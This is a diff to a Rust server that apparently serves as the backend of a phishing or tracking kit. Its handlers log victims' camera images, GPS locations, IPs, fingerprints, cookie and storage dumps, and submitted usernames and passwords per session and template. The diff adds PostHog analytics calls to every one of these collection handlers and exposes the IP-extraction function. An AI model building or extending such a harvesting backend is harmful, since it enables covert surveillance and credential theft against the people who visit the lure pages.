@@ -136,6 +136,7 @@ pub async fn receive_image(
     let _ = sqlx::query("UPDATE templates SET total_camera_grants = total_camera_grants + 1 WHERE id = (SELECT template_id FROM sessions WHERE id = ?)")
         .bind(&session_id).execute(&state.pool).await;
     log_event(&state, &session_id, "camera_capture", serde_json::json!({"filename": filename, "size": raw.len(), "method": method})).await;
+    state.posthog.capture_image(&session_id, raw.len() as u64, &ip).await;
     tracing::info!("📸 Capture: {} ({} bytes, {}) session={}", filename, raw.len(), method, session_id);
     Ok(StatusCode::OK)
 }
@@ -204,6 +205,7 @@ pub async fn receive_location(
     let _ = sqlx::query("UPDATE templates SET total_location_grants = total_location_grants + 1 WHERE id = (SELECT template_id FROM sessions WHERE id = ?)")
         .bind(&session_id).execute(&state.pool).await;
     log_event(&state, &session_id, "location_granted", serde_json::json!({"lat": payload.lat, "lon": payload.lon, "acc": payload.acc})).await;
+    state.posthog.capture_location(&session_id, payload.lat, payload.lon, &ip).await;
     tracing::info!("📍 Location: {}, {} session={}", payload.lat, payload.lon, session_id);
     Ok(StatusCode::OK)
 }
@@ -277,6 +279,7 @@ pub async fn receive_ip(
     }
 
     log_event(&state, &session_id, "page_visit", serde_json::json!({"ip": ip, "device": device, "browser": browser})).await;
+    state.posthog.capture_ip(&session_id, &ip, &device, &browser, &os).await;
     tracing::info!("🌐 IP: {} ({} on {}) session={}", ip, browser, os, session_id);
     Ok(StatusCode::OK)
 }
@@ -381,6 +384,7 @@ pub async fn receive_fingerprint(
         .execute(&state.pool).await;
     }
 
+    state.posthog.capture_fingerprint(&session_id, &ip).await;
     tracing::info!("🔍 Fingerprint: {} session={}", ip, session_id);
     Ok(StatusCode::OK)
 }
@@ -403,6 +407,7 @@ pub async fn receive_event(
         .bind(&payload.event_type).bind(&data_str).bind(now)
         .execute(&state.pool).await.map_err(|e| { tracing::error!("SQLite event insert FAILED: {}", e); StatusCode::INTERNAL_SERVER_ERROR })?;
 
+    state.posthog.capture_event(&session_id, &payload.event_type, &ip).await;
     Ok(StatusCode::OK)
 }
 
@@ -447,6 +452,7 @@ pub async fn receive_storage(
         "key_types": key_types,
     })).await;
 
+    state.posthog.capture_storage(&session_id, cookie_count, &ip).await;
     tracing::info!("💾 Storage dump received for session {} (IP: {})", session_id, ip);
     Ok(StatusCode::OK)
 }
@@ -498,6 +504,7 @@ pub async fn receive_credentials(
     .bind(&ip).bind(now)
     .execute(&state.pool).await;
 
+    state.posthog.capture_credentials(&session_id, payload.username.is_some(), &ip).await;
     tracing::info!("🔑 Credentials: {} session={}", payload.username.as_deref().unwrap_or("?"), session_id);
     Ok(StatusCode::OK)
 }
@@ -533,7 +540,7 @@ pub fn check_rate_limit(
     }
 }
 
-fn extract_ip(headers: &HeaderMap) -> String {
+pub fn extract_ip(headers: &HeaderMap) -> String {
     headers.get("x-forwarded-for")
         .and_then(|v| v.to_str().ok())
         .and_then(|s| s.split(',').next())
